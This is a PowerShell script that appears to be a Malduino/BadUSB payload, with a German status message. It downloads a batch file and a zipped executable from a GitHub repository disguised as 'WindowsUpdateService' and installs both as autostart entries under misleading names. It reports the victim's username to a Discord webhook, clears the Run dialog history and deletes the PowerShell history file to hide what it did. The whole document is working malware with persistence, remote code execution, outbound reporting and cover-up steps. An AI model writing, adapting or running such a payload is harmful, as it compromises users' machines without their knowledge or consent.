# Command 1
$data = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/DanielAckermann69/WindowsUpdateService/main/redownload.txt'

# Command 2
Start-Sleep -Seconds 5
$webhookUrl = 'https://discord.com/api/webhooks/1100407460491169862/Wb_kr_f72PHdI5HhozZXMRekfr9XPtdXtw4TWjPLZARjT4sD0TraoPpuxhf8N2FNTY4E'
$message = "Malduino w hat den download beim User $env:USERNAME gestarted."
$body = @{content = $message} | ConvertTo-Json
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'

# Command 3
New-Item -Path "C:/Users/$env:USERNAME/Documents/w.bat"
Set-Content -Path "C:/Users/$env:USERNAME/Documents/w.bat" -Value $data.Content

# Command 4
Start-Sleep -Seconds 5
New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "teams-updater" -Value "C:\Users\$env:USERNAME\Documents\w.bat" -PropertyType String
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f


# Command 5
taskkill -im WindowsUpdateService.exe -f
Remove-Item -Path "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__/WindowsUpdateService-main" -Recurse -Force
New-Item -ItemType "directory" -Path "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__"

# Command 6
Invoke-WebRequest -Uri "https://github.com/DanielAckermann69/WindowsUpdateService/archive/refs/heads/main.zip" -OutFile "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__/v2.zip"
Expand-Archive -Path "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__/v2.zip" -DestinationPath "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__"

# Command 7
New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "start" -Value "C:\Users\$env:USERNAME\AppData\Roaming\__browsergame__\WindowsUpdateService-main\WindowsUpdateService.exe" -PropertyType String
start "C:/Users/$env:USERNAME/AppData/Roaming/__browsergame__/WindowsUpdateService-main/WindowsUpdateService.exe"

# Command 8
Remove-Item (Get-PSReadlineOption).HistorySavePath
